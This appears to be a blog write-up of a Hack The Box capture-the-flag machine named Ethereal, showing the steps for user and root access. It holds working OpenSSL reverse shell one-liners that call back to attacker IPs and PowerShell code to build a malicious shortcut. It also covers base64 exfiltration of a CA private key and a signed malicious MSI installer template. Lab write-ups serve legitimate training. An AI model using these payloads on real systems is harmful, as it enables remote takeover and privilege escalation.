cmd c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136

c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136
quiet | cmd.exe |
cmd.exe w
</code></pre>

<pre><code>c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73| cmd.exe | c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect 10.10.14.2:136&quot;
</code></pre>

<p>making a malicous short cut.</p>

<pre><code>
</code></pre>

<pre><code> $WScript = New-Object -COM WScript.shell
&gt;&gt; $SC= $WScript.CreateShortcut('pinkiepie.lnk')
&gt;&gt; $SC
&gt;&gt; $SC.TargetPath=&quot;C:\Windows\System32\cmd.exe&quot;
&gt;&gt; $SC.Arguments=&quot;/c c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 172.16.42.86:9913| cmd.exe | c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect 172.16.42.86:9135&quot;
&gt;&gt; $sc
&gt;&gt; $SC.Save()
</code></pre>

<pre><code>$WScript = New-Object -COM WScript.shell
$SC= $WScript.CreateShortcut('pinkiepie.lnk')
$SC
$SC.TargetPath=&quot;C:\Windows\System32\cmd.exe&quot;
$SC.Arguments=&quot;/c c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136&quot;
$sc
$SC.Save()
</code></pre>

<pre><code>set PATH=&quot;c:\progra~2\openssl-v1.1.0\bin\&quot;;%PATH%
openssl base64 -in myca.cer
openssl base64 -in myca.pvk
</code></pre>

<p>there was a d drive a missed in the begining i didn&rsquo;t have permissios to that i can now use as jorge that is where vs is installed.</p>

<p><a href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a></p>

<pre><code>candle.exe msigen.wix
light.exe msigen.wixobj
</code></pre>

<pre><code>set PATH=C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\;%PATH%
</code></pre>

<pre><code>&quot;c:\users\user\desktop\wix311-binaries\candle.exe&quot; death-pie.wix
&quot;c:\users\user\desktop\wix311-binaries\light.exe&quot; death-pie.wixobj
</code></pre>

<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\makecert.exe&quot; -pe -n &quot;CN=Ethereal&quot; -a sha256 -cy end -sky signature -ic .\myca.cer -iv .\myca.pvk -sv .\death-pie.pvk .\death-pie.cer
</code></pre>

<pre><code>c:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin
</code></pre>

<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\pvk2pfx.exe&quot; -pvk death-pie.pvk -spc death-pie.cer -pfx death-pie.pfx
</code></pre>

<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\signtool.exe&quot; sign /v /f death-pie.pfx death-pie.msi
</code></pre>

<p>ippsec uses the laready placed lnk isntead of intereing a new command</p>

<p>copy</p>

<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 73 &lt; ../smb/death-pie.msi
c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 &gt; c:\users\public\desktop\shortcuts\death-pie.msi
</code></pre>

<p><strong>USER.TXT</strong></p>

<p>couple phases for user first make a Malicious lnk file. make one on a windows machine using powershell, or <a href="https://github.com/Plazmaz/LNKUp">LNKup</a>  (kali) once you have made the file move it over to kali. then upload it to ethereal. move it to c:\users\public\desktop\shortcuts. then setup the openssl listeners. the script should click on it within a minute. Find a note in the d drive which is used by visual studio in the case. dev\msis is where the is note.  we will also find the certs in the d drive.</p>

<pre><code>fsutil fsinfo drives
</code></pre>

<pre><code>$WScript = New-Object -COM WScript.shell
$SC= $WScript.CreateShortcut('pinkiepie.lnk')
$SC
$SC.TargetPath=&quot;C:\Windows\System32\cmd.exe&quot;
$SC.Arguments=&quot;/c c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 172.16.42.86:9913| cmd.exe | c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect 172.16.42.86:9135&quot;
$sc
$SC.Save()
</code></pre>

<p>We will also find the certs need to sign the installer in the d drive under the cert directory. moving those was pretty easy i think using openssl to base64 encode the certs then move them over. base64 will help preserver all the hidden characters etc. copy and paste over.</p>

<pre><code>c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.cer
c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.pvk
</code></pre>

<h3 id="root-txt"><strong>ROOT.TXT</strong></h3>

<p>this part can be rather tricky. so first off i move the myca files over then added them to CA root authority. i spent my nights trying to get this part to work but i wasn&rsquo;t able to properly sign the binary i suppose and never got a shell. because of this error.</p>

<p>first i made the wix using <a href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a> an awesome template. an aweosme read and apartently there a big that remove the entry for add or remote programs so you can remove. by running a vbscript</p>

<pre><code>&lt;File Id=&quot;ApplicationFile1&quot; Source=&quot;example.exe&quot;/&gt;
</code></pre>

<p>Have a couple of choices first is to use the openssl command or use the lnk file used to get user.</p>

<pre><code>&lt;Property Id=&quot;cmdline&quot;&gt;cmd /c HERE OVER HERE
</code></pre>

<p>there are some slight change you could use instead of openssl-v1.1.0 or openss~1.0.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/rehFxYY.jpg" alt="rehFxYY" /></p>

<pre><code>cmd /c c:\users\public\desktop\shortcuts\pinkiepie.lnk
cmd /c c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136
</code></pre>

<p>this is optional. impersonate the user or run as system.</p>

<pre><code> Return=&quot;ignore&quot; Impersonate=&quot;no&quot;/&gt;
</code></pre>

<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt;
  &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt;
    &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt;
    &lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&gt;

    &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt;
      &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt;
        &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt;
          &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt;
            &lt;File Id=&quot;ApplicationFile1&quot; Source=&quot;example.exe&quot;/&gt;
          &lt;/Component&gt;
        &lt;/Directory&gt;
      &lt;/Directory&gt;
    &lt;/Directory&gt;

    &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt;
      &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt;
    &lt;/Feature&gt;

    &lt;Property Id=&quot;cmdline&quot;&gt;COMMANDS HERE
    &lt;/Property&gt;

    &lt;CustomAction Id=&quot;SystemShell&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand='[cmdline]' Return=&quot;ignore&quot; Impersonate=&quot;yes&quot;/&gt;
    &lt;CustomAction Id=&quot;FailInstall&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt;
      invalid vbs to fail install
    &lt;/CustomAction&gt;

    &lt;InstallExecuteSequence&gt;
      &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt;
      &lt;Custom Action=&quot;FailInstall&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt;
    &lt;/InstallExecuteSequence&gt;

  &lt;/Product&gt;
&lt;/Wix&gt;
</code></pre>

<p>CN is important. -a may not be</p>

<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\makecert.exe&quot; -pe -n &quot;CN=My spc&quot; -a sha256 -cy end -sky signature -ic myca.cer -iv myca.pvk -sv myspc.pvk myspc.cer
</code></pre>

<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\pvk2pfx.exe&quot; -pvk myspc.pvk -spc myspc.cer -pfx myspc.pfx
</code></pre>

<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\signtool.exe&quot; sign /v /f myspc.pfx test.msi
</code></pre>

<p>verifying is VERY IMPORTANT. because like i figured out you wont know whats going on i was able to use this to figure out some problems i had locally.</p>

<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\signtool.exe&quot; verify /pa \Users test.msi
</code></pre>

<p>INSTALL CERT</p>

<p>right click on myca.cer</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/install cert.PNG" alt="install cert" /></p>

<p>select user</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/install cert2.PNG" alt="install cert2" /></p>

<p>select certificates go to browse then select trusted root.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/install cert3.PNG" alt="install cert3" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/install cert4.PNG" alt="install cert4" /></p>

<p>I would like to note if you don&rsquo;t do this first you may get this error.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/farts.PNG" alt="farts" /></p>

<p>Once the CA is added, still might see a error but it verifies the root authority.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/verify.PNG" alt="verify" /></p>

<p>Setup the netcat listener make sure to kill the listener you are using. I liked using the nc listener will tell you when the upload is finished by exiting out which was really nice.</p>

<pre><code>ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 136 &lt; test.msi
c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:136 &gt; c:\users\public\desktop\shortcuts\test.msi
</code></pre>

<p>Then login as jorge this is nessiary to move the files around to the correct location. once you copy the file over but sure to close everything out and restart the openssl listeners. this is on a five minute cycle try and do everything towards the 3 min mark so none of the listener close out.</p>

<pre><code>dir d:\dev\msis
copy /y c:\users\public\desktop\shortcuts\test.msi d:\dev\msis
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/32g512.jpg" alt="32g512" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/root-finale.PNG" alt="root-finale" /></p>

<p>LOOT</p>

<p>the script that ran to get root</p>

<pre><code>:loop

echo opening MSIs

PING localhost -n 300 &gt;NUL

dir /B &quot;D:\DEV\MSIs\*.msi&quot; &gt; &quot;C:\Users\rupal\Documents\files.txt&quot;                                  

for /F &quot;tokens=*&quot; %%A in (files.txt) do move &quot;D:\DEV\MSIs\%%A&quot; &quot;C:\Users\rupal\Documents\MSI Testing&quot; &amp;&amp; START &quot;&quot; &quot;C:\Windows\System32\msiexec.exe&quot; /i &quot;C:\Users\rupal\Documents\MSI Testing\%%A&quot; /norestart &amp;&amp; PING localhost -n 15 &gt;NUL &amp;&amp; taskkill /F /IM msiexec.exe &amp;&amp; del /F &quot;C:\Users\rupal\Documents\MSI Testing\%%A&quot;

del /F &quot;C:\Users\rupal\Documents\files.txt&quot;

cls

GOTO loop

</code></pre>

<p>the script to get user.txt</p>

<pre><code>@echo off

:loop

echo opening program

PING localhost -n 5 &gt;NUL

START /MIN &quot;&quot; cmd /c &quot;C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk&quot; &amp;&amp; PING localhost -n 5 &gt;NUL &amp;&amp; copy /Y &quot;C:\Users\jorge\Documents\Visual Studio 2017.lnk&quot; &quot;C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk&quot; &amp;&amp; PING localhost -n 50 &gt;NUL &amp;&amp; taskkill /F /IM devenv.exe             

cls

GOTO loop
</code></pre>


    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/hackthebox/boxes/devel/" title="Devel"> <i class="fa fa-chevron-left"></i><label>Devel</label></a>
    <a class="nav nav-next" href="/hackthebox/boxes/flujab/" title="Flujab" style="margin-right: 0px;"><label>Flujab</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/ethereal.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>